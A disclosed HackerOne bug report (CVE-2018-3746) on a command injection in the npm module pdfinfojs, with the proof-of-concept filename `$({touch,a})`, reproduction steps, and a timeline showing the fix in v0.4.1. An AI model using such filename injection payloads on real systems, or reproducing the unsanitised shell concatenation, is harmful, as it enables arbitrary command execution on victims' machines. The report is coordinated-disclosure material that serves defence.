---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/command-injection-generic
  - env/web
  - stack/node
  - vuln/command-injection
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2018-04-19
submitted: 2018-03-29T01:18:13.084Z
bounty_usd: null
votes: 15
cve: "CVE-2018-3746"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "caioluders"
source: "https://hackerone.com/reports/330957"
title: "[pdfinfojs] Command Injection on filename parameter"
---
# [pdfinfojs] Command Injection on filename parameter

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 15 | **Program:** Node.js third-party modules | **Disclosed:** 2018-04-19

- Report: [https://hackerone.com/reports/330957](https://hackerone.com/reports/330957)
- CWE: Command Injection - Generic | CVE: CVE-2018-3746
- Submitted: 2018-03-29T01:18:13.084Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hello , there is a Command Injection vulnerability on the "pdfinfojs" module.

# Module

**module name:** pdfinfojs
**version:** 0.3.6
**npm page:** https://www.npmjs.com/package/pdfinfojs

## Module Description

> pdfinfo shell wrapper for Node.js

## Module Stats

10 downloads in the last day
61 downloads in the last week
106 downloads in the last month

# Vulnerability

## Vulnerability Description

> The module appends the filename parameter to the command on the lines [28](https://github.com/fagbokforlaget/pdfinfojs/blob/master/lib/pdfinfo.js#L28), [47](https://github.com/fagbokforlaget/pdfinfojs/blob/master/lib/pdfinfo.js#L47) and [72](https://github.com/fagbokforlaget/pdfinfojs/blob/master/lib/pdfinfo.js#L72) without parsing the user input, thus leading to a Command Injection. 

## Steps To Reproduce:

* Install the module 

```
$ npm install pdfinfojs
```

* Example code, similar to the documentation, with the malicious filename `$({touch,a})` :

```javascript
var pdfinfo = require('pdfinfojs'),
    pdf = new pdfinfo('$({touch,a})'); // Malicious payload

pdf.getInfo(function(err, info, params) {
  if (err) {
    console.error(err.stack);
  }
  else {
    console.log(info); //info is an object
    console.log(params); // commandline params passed to pdfinfo cmd
  }
});
```

*there are a lot of possibles payloads to achieve this, used this brace expansion just because space in the file name sucks*

* Run the code 

```
$ node index.js
Error
    ... it throws an error, but the execution is successful
```
* Check the newly created file 

```
$ ls
a		index.js
```

## Patch

It is advisable to use a module that explicitly isolates the parameters to the `pdfinfo` command.

## Tested on :

- macOS Sierra 10.12.16
- NODEJS v8.4.0
- NPM 5.3.0

**( contacted the maintainer || opened issue ) = False**

## Impact

An attacker can execute arbitrary commands on the victim's machine

## Timeline

- **Report Filed**
- **Report Triaged**
- **Changed Scope**
- **External User Joined**
- **2018-04-13** @iapain: @marcinhoppe @caioluders Thanks for reporting this issue. Now this lib is no longer dependent on shelljs, it uses built-in `child_process` module, whic
- **2018-04-13** @iapain: Fixed in v0.4.1
- **2018-04-13** @caioluders: I confirm that the vulnerability is fixed.
- **2018-04-17** @marcinhoppe: I requested a CVE number for this vulnerability from HackerOne.
- **2018-04-18** @marcinhoppe: @caioluders @iapain As we now have the fix available, I am going to make a public disclosure of the issue by the end of the week. If you have any objections, just let me know.
- **2018-04-18** @caioluders: @marcinhoppe All good for me.
- **2018-04-18** @iapain: @marcinhoppe Same here! Please go ahead. Kudos to @caioluders for discovering it.
- **Report Resolved**
- **Agreed On Going Public**
- **Report Severity Updated**
- **Manually Disclosed**
- **Cve Id Added**
